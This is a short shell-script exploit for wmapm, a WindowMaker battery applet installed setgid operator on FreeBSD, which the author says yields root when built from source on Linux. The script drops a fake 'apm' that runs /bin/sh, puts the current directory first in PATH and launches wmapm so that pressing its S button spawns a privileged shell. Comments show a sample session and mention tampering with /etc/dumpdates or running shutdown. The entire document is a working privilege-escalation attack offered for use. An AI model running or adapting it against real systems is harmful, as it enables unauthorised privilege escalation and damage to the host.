#/bin/sh
# Pretty useless, we can mess up /etc/dumpdates or run shutdown
# on FreeBSD systems with wmapm from ports.
# If wmapm is installed from source we get root instead,
# so I suppose this might be worth something(uid 0) on linux.
# kokanin@dtors~ pkg_info | grep -i wmapm
# wmapm-3.1           Laptop battery status display for WindowMaker
# kokanin@dtors~ ls -la `which wmapm`    
# -rwxr-sr-x  1 root  operator  41892 Mar 23 10:00 /usr/X11R6/bin/wmapm
# kokanin@dtors~ sh DSR-wmapm.sh
# press the S button when wmapm starts
# $ /usr/bin/id
# uid=1001(kokanin) gid=1001(kokanin) egid=5(operator) groups=5(operator), 1001(kokanin), 0(wheel), 666(lewsers)
echo "/bin/sh" > apm
chmod +x ./apm
echo "press the S button(not the key, the BUTTON, in the PROGRAM) when wmapm starts"
export PATH=.:$PATH
/usr/X11R6/bin/wmapm
rm ./apm